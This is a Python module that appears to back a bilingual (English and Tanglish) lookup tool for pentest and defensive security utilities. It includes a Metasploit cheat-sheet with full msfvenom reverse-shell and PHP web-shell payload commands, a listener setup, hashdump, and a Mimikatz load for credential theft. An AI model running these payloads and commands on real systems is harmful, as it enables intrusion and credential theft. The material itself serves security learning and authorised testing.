        "usage": "rcrack <tables_path> -h <hash>",
        "example": "rcrack ./tables -h 5f4dcc3b5aa765d61d8327deb882cf99",
        "flags": {"-h": "a single hash", "-l": "a hash list file"},
    },
    "rainbowcrack": {"alias": "rcrack"},
    "brutus": {
        "cat": "Passwords / Legacy (Windows GUI)",
        "purpose": "Old Windows GUI login brute-forcer (HTTP/FTP/POP3). Dated today — prefer hydra/medusa.",
        "purpose_ta": "Pazhaya Windows GUI login brute-forcer. Ipo hydra/medusa use panradhu nalladhu.",
        "usage": "GUI (Windows only)", "example": "(GUI tool)", "flags": {},
    },
    "l0phtcrack": {
        "cat": "Passwords / Windows (GUI)",
        "purpose": "Windows password auditing and recovery tool (GUI).",
        "purpose_ta": "Windows password audit/recovery GUI tool.",
        "usage": "GUI (Windows)", "example": "(GUI tool)", "flags": {},
    },

    # ================= Wireless (aircrack-ng suite) =================
    "airmon-ng": {
        "cat": "Wireless",
        "purpose": "Enable/disable Wi-Fi monitor mode and list wireless interfaces.",
        "purpose_ta": "Wi-Fi monitor mode on/off panna, wireless interfaces list panna.",
        "usage": "airmon-ng <start|stop|check> <iface>",
        "example": "airmon-ng start wlan0",
        "flags": {"start": "enable monitor mode on an interface", "stop": "disable monitor mode",
                  "check": "show processes that interfere", "check kill": "kill interfering processes"},
        "flags_ta": {"start": "monitor mode on panna", "stop": "monitor mode off panna",
                     "check": "idaiyoodura processes kaatta"},
    },
    "airodump-ng": {
        "cat": "Wireless",
        "purpose": "Capture Wi-Fi traffic/beacons; find networks and capture handshakes (your own network).",
        "purpose_ta": "Wi-Fi traffic/beacons capture panni networks, handshakes pidikka (un sontha network).",
        "usage": "airodump-ng [options] <iface_mon>",
        "example": "airodump-ng --bssid <bssid> -c <channel> -w capture wlan0mon",
        "flags": {"--bssid": "focus on one access point", "-c": "lock to a channel", "-w": "write capture to a file",
                  "--write": "write capture to a file"},
        "flags_ta": {"--bssid": "oru AP-a mattum", "-c": "channel lock panna", "-w": "capture-a file-la save"},
    },
    "aireplay-ng": {
        "cat": "Wireless",
        "purpose": "Inject/replay Wi-Fi frames and test packet injection (your own network only).",
        "purpose_ta": "Wi-Fi frames inject/replay panna, injection test panna (un sontha network mattum).",
        "usage": "aireplay-ng [options] <iface_mon>",
        "example": "aireplay-ng --test wlan0mon",
        "flags": {"--test": "test packet injection support", "--deauth": "deauthentication (own network)",
                  "-a": "access point BSSID", "-c": "client MAC"},
        "flags_ta": {"--test": "injection support test", "-a": "AP BSSID"},
    },

    # ================= Auditing =================
    "lynis": {
        "cat": "Auditing / Hardening",
        "purpose": "Audit a Linux system for security issues and hardening tips.",
        "purpose_ta": "Linux system-a security issues, hardening-ku audit panna.",
        "usage": "lynis <command>   (e.g. audit system)",
        "example": "sudo lynis audit system",
        "flags": {"audit": "audit system = run a full system audit", "--quick": "quicker, less interactive audit",
                  "--tests-from-group": "run one test group (malware/networking/authentication)",
                  "show": "list info (version/commands/groups/categories/profiles/plugins/settings)",
                  "--profile": "run with a custom profile", "update": "update info = check for updates",
                  "upload-only": "upload previous audit data"},
        "flags_ta": {"audit": "audit system = full audit", "--quick": "vegama (quick) audit",
                     "show": "info list panna", "--profile": "custom profile vachi"},
    },

    # ================= Modern Recon / Web (current) =================
    "nuclei": {
        "cat": "Modern Web / Scanning",
        "purpose": "Template-based vulnerability scanner — fast, community templates for known CVEs & misconfigs.",
        "purpose_ta": "Template vachi known vulnerabilities fast-a scan pannum (CVE, misconfig). Modern recon-oda must-have. Defense: patch + template-la varra issues fix pannu.",
        "usage": "nuclei -u <url> [-t templates]",
        "example": "nuclei -u http://10.10.10.5 -t cves/",
        "flags": {"-u": "target URL", "-t": "template/dir to run", "-l": "list of targets file",
                  "-severity": "filter by severity (critical/high)", "-tags": "run templates by tag",
                  "-o": "save output", "-rl": "rate limit", "-json": "JSON output"},
        "flags_ta": {"-u": "target", "-t": "entha template", "-severity": "severity filter", "-o": "output save"},
    },
    "httpx": {
        "cat": "Modern Web / Recon",
        "purpose": "Fast multi-purpose HTTP probe — find live web servers, titles, status, tech.",
        "purpose_ta": "Niraya host-la entha web server live, title, status, tech enna nu fast-a probe pannum.",
        "usage": "httpx -l <hosts.txt>",
        "example": "cat subs.txt | httpx -title -tech-detect",
        "flags": {"-l": "input host list", "-title": "show page title", "-status-code": "show status",
                  "-tech-detect": "detect technologies", "-sc": "status code", "-o": "output file"},
        "flags_ta": {"-l": "host list", "-title": "title kaattu", "-tech-detect": "tech kandupidi"},
    },
    "katana": {
        "cat": "Modern Web / Crawling",
        "purpose": "Next-gen web crawler — map a site's URLs, endpoints and JS for recon.",
        "purpose_ta": "Oru site-oda ella URLs, endpoints, JS-a crawl panni map pannum (recon).",
        "usage": "katana -u <url>",
        "example": "katana -u http://10.10.10.5 -d 3",
        "flags": {"-u": "target URL", "-d": "crawl depth", "-jc": "crawl JS files",
                  "-o": "output", "-silent": "quiet output"},
        "flags_ta": {"-u": "target", "-d": "depth", "-jc": "JS crawl"},
    },
    "amass": {
        "cat": "Recon / OSINT",
        "purpose": "In-depth attack-surface mapping and subdomain enumeration.",
        "purpose_ta": "Oru domain-oda subdomains + attack surface full-a map pannum. Defense: un public footprint idhil paathu kuraikka.",
        "usage": "amass enum -d <domain>",
        "example": "amass enum -d example.com",
        "flags": {"enum": "run enumeration", "-d": "target domain", "-passive": "passive sources only",
                  "-active": "active enumeration", "-o": "output file", "-brute": "brute-force subdomains"},
        "flags_ta": {"enum": "enumeration", "-d": "domain", "-passive": "passive mattum", "-o": "output"},
    },
    "dnsenum": {
        "cat": "Recon / OSINT",
        "purpose": "Enumerate DNS info — records, subdomains, zone transfers.",
        "purpose_ta": "DNS records, subdomains, zone transfer info sekari.",
        "usage": "dnsenum <domain>",
        "example": "dnsenum example.com",
        "flags": {"--enum": "shortcut for common options", "-f": "subdomain wordlist",
                  "--threads": "thread count", "-r": "recursive subdomains"},
        "flags_ta": {"--enum": "common options", "-f": "wordlist", "-r": "recursive"},
    },
    "dalfox": {
        "cat": "Modern Web / XSS",
        "purpose": "Fast XSS scanner and parameter analyser.",
        "purpose_ta": "XSS vulnerabilities fast-a scan pannum. Defense: output encoding + CSP.",
        "usage": "dalfox url <url>",
        "example": "dalfox url 'http://10.10.10.5/search?q=test'",
        "flags": {"url": "scan a single URL", "pipe": "read targets from stdin", "-b": "blind XSS callback",
                  "--custom-payload": "custom payload file", "-o": "output"},
        "flags_ta": {"url": "oru URL", "-b": "blind XSS", "-o": "output"},
    },

    # ================= Fast scanners =================
    "rustscan": {
        "cat": "Recon / Scanning",
        "purpose": "Ultra-fast port scanner; pipes open ports into Nmap for details.",
        "purpose_ta": "Romba fast-a ports scan panni, open ports-a Nmap-ku pass pannum.",
        "usage": "rustscan -a <target>",
        "example": "rustscan -a 10.10.10.5 -- -sV",
        "flags": {"-a": "address/target", "-p": "ports", "-r": "port range", "--": "pass args to nmap",
                  "-b": "batch size (speed)", "-t": "timeout"},
        "flags_ta": {"-a": "target", "-p": "ports", "--": "nmap-ku args", "-b": "speed"},
    },
    "naabu": {
        "cat": "Recon / Scanning",
        "purpose": "Fast SYN/CONNECT port scanner built for automation.",
        "purpose_ta": "Fast port scanner — automation-ku suitable.",
        "usage": "naabu -host <target>",
        "example": "naabu -host 10.10.10.5 -top-ports 1000",
        "flags": {"-host": "target", "-p": "ports", "-top-ports": "top N ports", "-o": "output"},
        "flags_ta": {"-host": "target", "-top-ports": "top ports", "-o": "output"},
    },

    # ================= Active Directory / Post-exploit =================
    "netexec": {
        "cat": "Post-Exploit / AD",
        "purpose": "Network/AD assessment swiss-army (successor to CrackMapExec) — SMB/WinRM/LDAP checks.",
        "purpose_ta": "Network/Active Directory assess panna all-in-one (CrackMapExec-oda successor). Defense: strong creds, SMB signing, monitoring. *Un lab/authorised mattum.*",
        "usage": "nxc <protocol> <target> -u user -p pass",
        "example": "nxc smb 10.10.10.5 -u admin -p pass",
        "flags": {"smb": "SMB protocol", "winrm": "WinRM", "ldap": "LDAP", "-u": "username",
                  "-p": "password", "--shares": "list shares", "-M": "run a module"},
        "flags_ta": {"smb": "SMB", "-u": "user", "-p": "pass", "--shares": "shares list"},
    },
    "bloodhound": {
        "cat": "Post-Exploit / AD",
        "purpose": "Maps Active Directory attack paths visually (uses graph theory).",
        "purpose_ta": "Active Directory-la attack paths-a graph-a kaatti analyse pannum. Defense: idhe tool vachi un AD weak paths kandupidichu fix pannu (blue team-um use pannum).",
        "usage": "bloodhound  (GUI) + a collector (SharpHound/bloodhound-python)",
        "example": "bloodhound-python -d corp.local -u user -p pass -c All",
        "flags": {"-d": "domain", "-u": "user", "-p": "password", "-c": "collection method (All)",
                  "-ns": "nameserver"},
        "flags_ta": {"-d": "domain", "-u": "user", "-c": "collection", "-ns": "nameserver"},
    },
    "impacket": {
        "cat": "Post-Exploit / AD",
        "purpose": "Python toolkit of network-protocol scripts (secretsdump, psexec, GetNPUsers...).",
        "purpose_ta": "Network protocol scripts collection — AD/Windows assessment-ku. Defense: Kerberos hardening, LAPS, monitoring. *Lab/authorised mattum.*",
        "usage": "impacket-<script> [args]",
        "example": "impacket-GetNPUsers corp.local/ -usersfile users.txt",
        "flags": {"secretsdump": "dump hashes", "psexec": "remote exec", "GetNPUsers": "AS-REP roasting",
                  "GetUserSPNs": "Kerberoasting", "smbserver": "quick SMB server"},
        "flags_ta": {"secretsdump": "hashes dump", "GetNPUsers": "AS-REP roast", "GetUserSPNs": "Kerberoast"},
    },
    "kerbrute": {
        "cat": "Post-Exploit / AD",
        "purpose": "Quickly enumerate and brute valid Kerberos (AD) usernames.",
        "purpose_ta": "AD-la valid usernames fast-a kandupidikka. Defense: lockout policy, monitoring, MFA.",
        "usage": "kerbrute userenum -d <domain> <userlist>",
        "example": "kerbrute userenum -d corp.local users.txt",
        "flags": {"userenum": "enumerate users", "passwordspray": "spray one password", "-d": "domain",
                  "--dc": "domain controller IP"},
        "flags_ta": {"userenum": "users enum", "passwordspray": "password spray", "-d": "domain"},
    },
    "responder": {
        "cat": "Post-Exploit / MITM",
        "purpose": "LLMNR/NBT-NS/mDNS poisoner that captures network hashes (lab/authorised).",
        "purpose_ta": "LLMNR/NBT-NS poison panni network hashes capture pannum. Defense: LLMNR/NBT-NS disable pannu, SMB signing — idhuthan #1 mitigation. *Un lab mattum.*",
        "usage": "responder -I <interface>",
        "example": "sudo responder -I eth0 -wd",
        "flags": {"-I": "network interface", "-w": "WPAD rogue server", "-d": "DHCP poisoning",
                  "-A": "analyze mode (passive, no poisoning)"},
        "flags_ta": {"-I": "interface", "-A": "passive analyze (safe)", "-w": "WPAD"},
    },
    "ligolo-ng": {
        "cat": "Post-Exploit / Pivoting",
        "purpose": "Modern tunneling/pivoting tool to reach internal networks via a compromised host (lab).",
        "purpose_ta": "Compromised host vazhiya internal network-a reach panna modern pivoting tool. Defense: network segmentation, egress filtering. *Lab/authorised mattum.*",
        "usage": "ligolo-ng (agent + proxy)",
        "example": "ligolo-proxy -selfcert",
        "flags": {"-selfcert": "self-signed cert", "agent": "run on target", "session": "manage sessions",
                  "ifconfig": "show tunnel interfaces"},
        "flags_ta": {"-selfcert": "self cert", "agent": "target-la", "session": "sessions"},
    },

    # ================= Web proxies / dynamic =================
    "zaproxy": {
        "cat": "Web / Proxy",
        "purpose": "OWASP ZAP — free web app scanner & intercepting proxy (Burp alternative).",
        "purpose_ta": "OWASP ZAP — free web vulnerability scanner + intercept proxy (Burp-ku free alternative). Defense practice-kum nalladhu.",
        "usage": "zaproxy  (GUI) / zap.sh -cmd ...",
        "example": "zaproxy",
        "flags": {"-quickurl": "quick scan a URL", "-quickout": "save report", "-daemon": "headless mode",
                  "-port": "proxy port"},
        "flags_ta": {"-quickurl": "quick scan", "-daemon": "headless", "-port": "port"},
    },
    "mitmproxy": {
        "cat": "Web / Proxy",
        "purpose": "Interactive HTTPS intercepting proxy for inspecting/modifying traffic.",
        "purpose_ta": "HTTPS traffic intercept panni paarka/modify panna (API/mobile testing-ku). *Un traffic/authorised mattum.*",
        "usage": "mitmproxy  /  mitmdump",
        "example": "mitmproxy -p 8080",
        "flags": {"-p": "listen port", "-w": "write flows to file", "-r": "read flows",
                  "--mode": "proxy mode (transparent/reverse)", "mitmdump": "non-interactive cli"},
        "flags_ta": {"-p": "port", "-w": "flows save", "--mode": "mode"},
    },
    "commix": {
        "cat": "Exploitation / Web",
        "purpose": "Automated command-injection detection and exploitation (lab targets).",
        "purpose_ta": "Command injection vulnerabilities automate-a kandupidikka. Defense: input validation, avoid shell calls. *Lab mattum.*",
        "usage": "commix -u <url>",
        "example": "commix -u 'http://10.10.10.5/ping?ip=127.0.0.1'",
        "flags": {"-u": "target URL", "--data": "POST data", "--os-cmd": "run a command", "--batch": "no prompts"},
        "flags_ta": {"-u": "target", "--data": "POST data", "--batch": "auto"},
    },

    # ================= Wireless (modern) =================
    "wifite": {
        "cat": "Wireless",
        "purpose": "Automated wireless auditing wrapper (WEP/WPA/WPS) — your own networks only.",
        "purpose_ta": "WiFi auditing automate pannum. Defense: WPA3, strong password, WPS off. *Un router/test AP mattum.*",
        "usage": "wifite",
        "example": "sudo wifite --wpa",
        "flags": {"--wpa": "target WPA only", "--wps": "target WPS", "-i": "interface", "--kill": "kill conflicts"},
        "flags_ta": {"--wpa": "WPA mattum", "-i": "interface", "--kill": "conflicts kill"},
    },
    "bettercap": {
        "cat": "Wireless / MITM",
        "purpose": "Swiss-army framework for network recon and MITM (WiFi/BLE/Ethernet) — authorised only.",
        "purpose_ta": "Network recon + MITM framework (WiFi/Bluetooth/Ethernet). Defense: HTTPS, ARP monitoring, network segmentation. *Un lab/authorised mattum.*",
        "usage": "bettercap -iface <interface>",
        "example": "sudo bettercap -iface eth0",
        "flags": {"-iface": "interface", "-caplet": "run a caplet script", "-eval": "run a command",
                  "net.probe": "discover hosts (inside)", "net.recon": "passive recon"},
        "flags_ta": {"-iface": "interface", "-caplet": "script", "net.probe": "hosts find"},
    },

    # ================= Cloud / Container (modern) =================
    "trivy": {
        "cat": "Cloud / Container",
        "purpose": "Scan containers, images, filesystems and IaC for vulnerabilities & misconfigs.",
        "purpose_ta": "Container images, filesystems, IaC-la vulnerabilities + misconfig scan pannum. Defense: build time-la scan panni fix pannu.",
        "usage": "trivy <subcommand> <target>",
        "example": "trivy image nginx:latest",
        "flags": {"image": "scan a container image", "fs": "scan a filesystem", "config": "scan IaC/configs",
                  "--severity": "filter severity", "repo": "scan a git repo"},
        "flags_ta": {"image": "image scan", "fs": "filesystem", "config": "IaC scan", "--severity": "severity"},
    },
    "kube-hunter": {
        "cat": "Cloud / Container",
        "purpose": "Hunt for security weaknesses in Kubernetes clusters.",
        "purpose_ta": "Kubernetes cluster-la security weaknesses thedum. Defense: RBAC, network policies, API lockdown.",
        "usage": "kube-hunter --remote <ip>  /  --pod",
        "example": "kube-hunter --remote 10.10.10.5",
        "flags": {"--remote": "scan a remote cluster", "--pod": "run from inside a pod", "--cidr": "scan a range",
                  "--report": "report format"},
        "flags_ta": {"--remote": "remote scan", "--pod": "pod-la irundhu", "--report": "report"},
    },
    "prowler": {
        "cat": "Cloud / Audit (defense)",
        "purpose": "Cloud security best-practice & compliance auditing (AWS/Azure/GCP).",
        "purpose_ta": "Cloud account-oda security + compliance audit (AWS/Azure/GCP). Idhu blue-team/defense tool — un account-a harden panna.",
        "usage": "prowler <provider>",
        "example": "prowler aws",
        "flags": {"aws": "audit AWS", "azure": "audit Azure", "gcp": "audit GCP",
                  "-c": "specific checks", "-M": "output format (html/json)"},
        "flags_ta": {"aws": "AWS audit", "-c": "checks", "-M": "output format"},
    },
    "scoutsuite": {
        "cat": "Cloud / Audit (defense)",
        "purpose": "Multi-cloud security auditing that produces an HTML risk report.",
        "purpose_ta": "Multi-cloud security audit → HTML risk report. Defense tool — misconfig kandupidichu fix panna.",
        "usage": "scout <provider>",
        "example": "scout aws",
        "flags": {"aws": "audit AWS", "azure": "Azure", "gcp": "GCP", "--report-dir": "output dir"},
        "flags_ta": {"aws": "AWS", "--report-dir": "output folder"},
    },

    # ================= Mobile =================
    "mobsf": {
        "cat": "Mobile Security",
        "purpose": "Mobile Security Framework — automated static/dynamic analysis of APK/IPA.",
        "purpose_ta": "Mobile app (APK/IPA) static + dynamic security analysis. Defense: secrets remove, cert pinning, MASVS follow. *Un app mattum.*",
        "usage": "mobsf  (web UI) — upload the app",
        "example": "./run.sh  # then open http://localhost:8000",
        "flags": {"static": "static analysis", "dynamic": "dynamic (emulator) analysis",
                  "api": "REST API for CI", "upload": "upload an app"},
        "flags_ta": {"static": "static analysis", "dynamic": "dynamic analysis", "api": "CI API"},
    },
    "frida": {
        "cat": "Mobile / RE",
        "purpose": "Dynamic instrumentation toolkit — hook and inspect app functions at runtime.",
        "purpose_ta": "Running app-oda functions-a runtime-la hook panni paarka/modify panna (mobile/RE). *Un app mattum.*",
        "usage": "frida -U -f <package>",
        "example": "frida -U -f com.example.app -l hook.js",
        "flags": {"-U": "USB device", "-f": "spawn app", "-l": "load script", "-n": "attach by name",
                  "--no-pause": "resume immediately"},
        "flags_ta": {"-U": "USB", "-f": "app spawn", "-l": "script load"},
    },
    "objection": {
        "cat": "Mobile / RE",
        "purpose": "Runtime mobile exploration built on Frida — bypass pinning, inspect storage (lab).",
        "purpose_ta": "Frida mel kattapatta mobile runtime toolkit — cert pinning bypass, storage inspect (testing). *Un app mattum.*",
        "usage": "objection -g <package> explore",
        "example": "objection -g com.example.app explore",
        "flags": {"explore": "interactive shell", "-g": "target package",
                  "android sslpinning disable": "bypass pinning", "memory": "inspect memory"},
        "flags_ta": {"explore": "interactive", "-g": "package", "sslpinning disable": "pinning bypass"},
    },
    "apktool": {
        "cat": "Mobile / RE",
        "purpose": "Decompile and rebuild Android APK resources and smali code.",
        "purpose_ta": "Android APK-a decompile/rebuild panna (resources + smali). *Un test APK mattum.*",
        "usage": "apktool d <app.apk>",
        "example": "apktool d app.apk -o out/",
        "flags": {"d": "decode/decompile", "b": "build back", "-o": "output dir", "-r": "skip resources",
                  "-s": "skip sources"},
        "flags_ta": {"d": "decompile", "b": "rebuild", "-o": "output"},
    },

    # ================= Forensics / Reverse Engineering =================
    "volatility3": {
        "cat": "Forensics / Memory",
        "purpose": "Analyse RAM memory dumps — processes, network, injected code (incident response).",
        "purpose_ta": "RAM memory dump-a analyse panna — processes, network, malware (blue-team/IR). Attack-ah kandupidikka.",
        "usage": "vol -f <dump> <plugin>",
        "example": "vol -f mem.raw windows.pslist",
        "flags": {"-f": "memory dump file", "windows.pslist": "list processes", "windows.netscan": "network connections",
                  "windows.malfind": "find injected code", "-o": "output dir"},
        "flags_ta": {"-f": "dump file", "pslist": "processes", "malfind": "injected code find"},
    },
    "ghidra": {
        "cat": "Reverse Engineering",
        "purpose": "Full-featured reverse-engineering suite (disassembler + decompiler).",
        "purpose_ta": "Binaries-a reverse engineer panna (disassemble + decompile). Malware analysis, RE-ku.",
        "usage": "ghidra  (GUI)",
        "example": "ghidra",
        "flags": {"(GUI)": "create project -> import binary -> analyze",
                  "analyzeHeadless": "scriptable headless mode"},
        "flags_ta": {"(GUI)": "project -> import -> analyze", "analyzeHeadless": "headless script mode"},
    },
    "radare2": {
        "cat": "Reverse Engineering",
        "purpose": "Command-line reverse-engineering and binary analysis framework.",
        "purpose_ta": "Command-line-la binary analysis / reverse engineering.",
        "usage": "r2 <binary>",
        "example": "r2 -A ./program",
        "flags": {"-A": "auto-analyze", "-d": "debug mode", "aaa": "analyze all (inside)",
                  "pdf": "print disassembly of function", "afl": "list functions"},
        "flags_ta": {"-A": "auto analyze", "-d": "debug", "afl": "functions list"},
    },

    # ================= Future / Emerging =================
    "garak": {
        "cat": "AI Security (future)",
        "purpose": "LLM vulnerability scanner — probes AI models for prompt injection, jailbreaks, leaks.",
        "purpose_ta": "LLM/AI model-a prompt injection, jailbreak, data leak-ku test pannum (AI security — future). Defense: guardrails, input/output filtering. *Un model/app mattum.*",
        "usage": "garak --model_type <type> --model_name <name>",
        "example": "python -m garak --model_type huggingface --model_name gpt2",
        "flags": {"--model_type": "backend type", "--model_name": "model", "--probes": "which probes to run",
                  "--report_prefix": "report name"},
        "flags_ta": {"--model_type": "backend", "--model_name": "model", "--probes": "probes"},
    },
    "sliver": {
        "cat": "C2 Framework (future) / defense",
        "purpose": "Modern open-source C2 (command-and-control) framework used in red-team ops (authorised).",
        "purpose_ta": "Modern C2 framework (red-team). Study panradhu mukkiyam ENNA-NALA: idhoda traffic-a epdi DETECT pandradhu nu — beaconing, rare domains, egress. Defense: NDR, egress filtering, EDR. *Authorised red-team/lab mattum.*",
        "usage": "sliver-server  (then generate/listen)",
        "example": "sliver > generate --mtls <ip>  (lab)",
        "flags": {"generate": "build an implant", "mtls": "mTLS listener", "http": "http listener",
                  "sessions": "list sessions", "(defense)": "detect via beaconing + egress monitoring"},
        "flags_ta": {"generate": "implant build", "sessions": "sessions", "(defense)": "beaconing detect pannu"},
    },
    "havoc": {
        "cat": "C2 Framework (future) / defense",
        "purpose": "Modern post-exploitation C2 framework (red-team, authorised) — study its detection.",
        "purpose_ta": "Modern C2 framework. Blue-team view: idhoda indicators (beacon, injection) epdi detect nu kathuko. Defense: EDR, memory scanning, network monitoring. *Authorised mattum.*",
        "usage": "havoc  (client + teamserver)",
        "example": "havoc server --profile profile.yaotl",
        "flags": {"server": "start team server", "client": "connect client",
                  "(defense)": "EDR + behaviour detection + egress control"},
        "flags_ta": {"server": "team server", "client": "client", "(defense)": "EDR + detection"},
    },

    # aliases / alternate invocations for the modern tools
    "nxc": {"alias": "netexec"},
    "bloodhound-python": {"alias": "bloodhound"},
    "mitmdump": {"alias": "mitmproxy"},
    "vol": {"alias": "volatility3"},
    "r2": {"alias": "radare2"},
    "scout": {"alias": "scoutsuite"},
    "zap": {"alias": "zaproxy"},
}

# ---------------------------------------------------------------- Metasploit (full set)
# msfconsole / meterpreter / msfvenom are workflows, not single shell commands, so they get
# their own structured cheat-sheet. Each row: (command, english, tanglish).

METASPLOIT: dict[str, list[tuple[str, str, str]]] = {
    "1 · Start & search": [
        ("msfconsole -q", "Start Metasploit (quiet, no banner)", "Metasploit-a open panna (banner illama)"),
        ("search type:exploit platform:windows smb", "Search modules by keyword/filters", "Keyword/filter vachi modules thedu"),
        ("search cve:2021 rank:excellent", "Search by CVE and reliability", "CVE / reliability vachi thedu"),
        ("use exploit/windows/smb/ms17_010_eternalblue", "Select a module to use", "Oru module-a select panna"),
        ("info", "Show details of the selected module", "Select panna module-oda details kaatta"),
        ("back", "Leave the current module", "Current module-la irundhu veliya vara"),
        ("show options", "Show the settings a module needs", "Module-ku thevaiyana settings kaatta"),
        ("show payloads", "List payloads that fit this exploit", "Indha exploit-ku porundhura payloads list"),
        ("show targets", "List target types for the exploit", "Exploit-oda target types list"),
    ],
    "2 · Configure the module": [
        ("set RHOSTS 127.0.0.1", "Set the target host(s)", "Target host(s)-a set panna"),
        ("set RPORT 445", "Set the target port", "Target port-a set panna"),
        ("set LHOST 127.0.0.1", "Set YOUR IP (for the shell to call back)", "Un IP-a set panna (shell thirumbi varanum)"),
        ("set LPORT 4444", "Set YOUR listening port", "Un listening port-a set panna"),
        ("set PAYLOAD windows/x64/meterpreter/reverse_tcp", "Choose the payload", "Payload-a select panna"),
        ("set TARGET 0", "Pick the target index", "Target index-a select panna"),
        ("setg RHOSTS 127.0.0.1", "Set globally (kept across modules)", "Global-a set panna (ella module-kum)"),
        ("unset RHOSTS", "Clear a setting", "Oru setting-a clear panna"),
        ("show advanced", "Show advanced options", "Advanced options kaatta"),
    ],
    "3 · Run the exploit": [
        ("check", "Test if the target is vulnerable (no attack)", "Target vulnerable-ah-nu test panna (attack illama)"),
        ("exploit", "Launch the exploit", "Exploit-a run panna"),
        ("run", "Same as exploit (for aux/scanner modules)", "exploit maadhiri (scanner modules-ku)"),
        ("exploit -j", "Run in the background as a job", "Background-la job-a run panna"),
        ("exploit -z", "Run but don't interact with the session yet", "Run panni session-la pogama iru"),
        ("jobs", "List background jobs", "Background jobs list"),
        ("kill <id>", "Stop a background job", "Oru job-a niruthu"),
    ],
    "4 · Sessions": [
        ("sessions", "List open sessions", "Open sessions list"),
        ("sessions -i 1", "Interact with session 1", "Session 1-la nuzhaiya"),
        ("sessions -l", "List with details", "Details-oda list"),
        ("sessions -k 1", "Kill session 1", "Session 1-a kill panna"),
        ("sessions -u 1", "Upgrade a shell to meterpreter", "Shell-a meterpreter-a upgrade panna"),
        ("background", "Send the current session to the background", "Current session-a background-ku anuppa"),
    ],
    "5 · Meterpreter (after you get a shell)": [
        ("sysinfo", "OS / host information", "OS / host info"),
        ("getuid", "Which user you are", "Nee entha user-nu kaatta"),
        ("getsystem", "Try to become SYSTEM/root", "SYSTEM/root aaga try panna"),
        ("hashdump", "Dump password hashes", "Password hashes-a dump panna"),
        ("ps", "List processes", "Processes list"),
        ("migrate <pid>", "Move into another process", "Innoru process-ku maara"),
        ("shell", "Drop to a native OS shell", "Native OS shell-ku pova"),
        ("download <remote> <local>", "Download a file", "File-a download panna"),
        ("upload <local> <remote>", "Upload a file", "File-a upload panna"),
        ("screenshot", "Capture the screen", "Screen screenshot eduka"),
        ("portfwd add -l 3389 -p 3389 -r <ip>", "Forward a remote port to you", "Remote port-a un kitta forward panna"),
        ("run post/multi/recon/local_exploit_suggester", "Suggest privesc exploits", "Privesc exploits suggest panna"),
        ("load kiwi", "Load Mimikatz (credential theft)", "Mimikatz-a load panna (credentials)"),
    ],
    "6 · Database & workspace": [
        ("db_status", "Check the database connection", "Database connection check panna"),
        ("workspace -a lab", "Make/switch a workspace", "Workspace create/switch panna"),
        ("db_nmap -sV 127.0.0.1", "Run nmap and store results in the DB", "nmap run panni results-a DB-la store"),
        ("hosts", "List discovered hosts", "Kandupidicha hosts list"),
        ("services", "List discovered services", "Kandupidicha services list"),
        ("creds", "List captured credentials", "Pidicha credentials list"),
        ("loot", "List gathered loot (hashes, files)", "Sekaricha loot list (hashes, files)"),
    ],
    "7 · msfvenom payloads (make a shell file)": [
        ("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f exe -o shell.exe",
         "Windows meterpreter EXE", "Windows meterpreter EXE"),
        ("msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf -o shell.elf",
         "Linux meterpreter ELF", "Linux meterpreter ELF"),
        ("msfvenom -p php/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw -o shell.php",
         "PHP web-shell payload", "PHP web-shell payload"),
        ("msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f exe -o rev.exe",
         "Plain reverse shell EXE", "Simple reverse shell EXE"),
        ("msfvenom -l payloads", "List all payloads", "Ella payloads-aiyum list"),
    ],
    "8 · Catch the shell (handler)": [
        ("use exploit/multi/handler", "The listener that catches your payload", "Payload-a pidikkura listener"),
        ("set PAYLOAD windows/x64/meterpreter/reverse_tcp", "Match the payload you built", "Build panna payload-a match panna"),
        ("set LHOST 127.0.0.1", "Your IP", "Un IP"),
        ("set LPORT 4444", "Your port", "Un port"),
        ("exploit -j", "Start the listener in the background", "Listener-a background-la start panna"),
    ],
}

# console command names that should trigger the Metasploit sheet when looked up
_MSF_WORDS = {"metasploit", "msf", "msfconsole", "meterpreter", "msfvenom", "payload", "payloads",
              "handler", "exploit", "hashdump", "getsystem", "sessions", "rhosts", "lhost", "mimikatz"}


def is_metasploit_query(query: str) -> bool:
    q = (query or "").strip().lower()
    if not q:
        return False
    first = q.split()[0]
    return first in _MSF_WORDS or base_tool(q).lower() in {"msfconsole", "msfvenom"} or "metasploit" in q


def metasploit_markdown(tanglish: bool = True) -> str:
    """The full Metasploit workflow cheat-sheet, grouped, EN + Tanglish."""
    out = ["## 🎯 Metasploit — full command set",
           "_The usual flow: **search → use → set options → exploit → session → meterpreter**. "
           "For your own lab / authorised targets only._", ""]
    for section, rows in METASPLOIT.items():
        out.append(f"### {section}")
        for cmd, en, ta in rows:
            line = f"- `{cmd}`\n  — {en}"
            if tanglish and ta and ta != en:
                line += f"  ·  _{ta}_"
            out.append(line)
        out.append("")
    out.append("**Tip:** build a payload with msfvenom (section 7), then catch it with the handler "
               "(section 8) — LHOST/LPORT must match on both sides.")
    return "\n".join(out)


# categories, for the browse list
CATEGORIES = [
    "Recon / Scanning", "Recon / Network", "Recon / Web", "Web / Content discovery", "Web / Fuzzing",
    "Web / Scanner", "Web / WordPress", "Web / SQL injection", "Web / HTTP client", "Web / Download",
    "Passwords / Brute-force", "Passwords / Cracking", "Passwords / Wordlists",
    "Exploitation / Metasploit", "Exploitation / Payloads", "Exploitation / Exploit-DB",
    "Exploitation / Networking", "Network / Sniffing", "Wireless", "Active Directory",
    "Active Directory / SMB", "Active Directory / Windows", "Privilege Escalation",
    "Linux / Files", "Linux / Text", "Linux / Permissions", "Linux / Processes",
    "Linux / Network", "Linux / Remote", "Linux / Packages", "Linux / Privesc",
]


# ---------------------------------------------------------------- lookup

def _resolve(name: str) -> tuple[str, dict] | None:
    entry = TOOLS.get(name)
    if entry is None:
        return None
    if "alias" in entry:                       # follow aliases (netcat -> nc)
        name = entry["alias"]
        entry = TOOLS.get(name, {})
    return name, entry


def get(name: str) -> dict | None:
    """Full entry for a tool name, following aliases."""
    r = _resolve((name or "").strip().lower())
    return dict(r[1], name=r[0]) if r else None


def base_tool(command_line: str) -> str:
    """The tool name from a command line, ignoring sudo/env prefixes and the path."""
    try:
        parts = shlex.split(command_line, comments=True)
    except ValueError:
        parts = command_line.split()
    skip = {"sudo", "time", "watch", "proxychains", "proxychains4"}
    for part in parts:
